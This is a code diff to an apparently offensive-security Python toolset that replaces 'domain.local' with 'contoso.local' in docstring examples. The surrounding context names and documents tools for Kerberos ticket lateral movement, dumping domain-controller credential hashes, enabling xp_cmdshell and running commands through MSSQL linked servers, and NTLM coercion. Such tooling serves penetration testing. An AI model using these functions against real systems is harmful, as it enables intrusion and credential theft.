@@ -317,7 +317,7 @@ class LateralMovementTools(Toolset):
 
         Args:
             username: Username to request TGT for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             password: Password for authentication (optional if using hash)
             hash: NTLM hash for authentication (optional if using password)
             dc_ip: Domain controller IP address (optional)
@@ -326,8 +326,8 @@ class LateralMovementTools(Toolset):
             Path to .ccache file or error message
 
         Example:
-            >>> get_tgt("admin", "domain.local", password="pass")  # pragma: allowlist secret
-            >>> get_tgt("admin", "domain.local", hash="aad3b435...")
+            >>> get_tgt("admin", "contoso.local", password="pass")  # pragma: allowlist secret
+            >>> get_tgt("admin", "contoso.local", hash="aad3b435...")
         """
         if not (password or hash):
             return "[!] Error: Either password or hash must be provided"
@@ -400,9 +400,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami && hostname)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -412,8 +412,8 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> psexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
-            >>> psexec_kerberos("dc01.domain.local", "admin", "domain.local", ticket_path="admin.ccache")
+            >>> psexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
+            >>> psexec_kerberos("dc01.contoso.local", "admin", "contoso.local", ticket_path="admin.ccache")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -467,9 +467,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -479,7 +479,7 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> wmiexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> wmiexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -532,9 +532,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -543,7 +543,7 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> smbexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> smbexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -596,9 +596,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for (e.g., 'Administrator')
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             dc_ip: Domain controller IP for Kerberos (optional)
             target_ip: Target IP address to connect to (overrides DNS resolution)
@@ -608,8 +608,8 @@ class LateralMovementTools(Toolset):
             Extracted credentials including NTLM hashes, Kerberos keys, and secrets
 
         Example:
-            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local")
-            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local", ticket_path="Administrator.ccache")
+            >>> secretsdump_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
+            >>> secretsdump_kerberos("dc01.contoso.local", "Administrator", "contoso.local", ticket_path="Administrator.ccache")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -1172,7 +1172,7 @@ class MSSQLTools(Toolset):
             xp_cmdshell enablement result
 
         Example:
-            >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1235,7 +1235,7 @@ RECONFIGURE;
             List of users that can be impersonated
 
         Example:
-            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1344,8 +1344,8 @@ WHERE a.permission_name = 'IMPERSONATE';
             Query result executed as the impersonated user
 
         Example:
-            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")  # First enumerate
-            >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")  # First enumerate
+            >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1400,7 +1400,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             List of linked servers with access information
 
         Example:
-            >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1465,8 +1465,8 @@ EXEC sp_linkedservers;
             Query result from the linked server
 
         Example:
-            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
-            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "contoso.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1527,7 +1527,7 @@ EXEC sp_linkedservers;
             Coercion attempt result
 
         Example:
-            >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "domain.local")
+            >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1588,7 +1588,7 @@ EXEC sp_linkedservers;
             xp_cmdshell enablement result on the linked server
 
         Example:
-            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "domain.local")
+            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1663,8 +1663,8 @@ EXEC sp_linkedservers;
             Command output from the linked server
 
         Example:
-            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "whoami", "domain.local")
-            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "hostname && ipconfig", "domain.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "whoami", "contoso.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "hostname && ipconfig", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
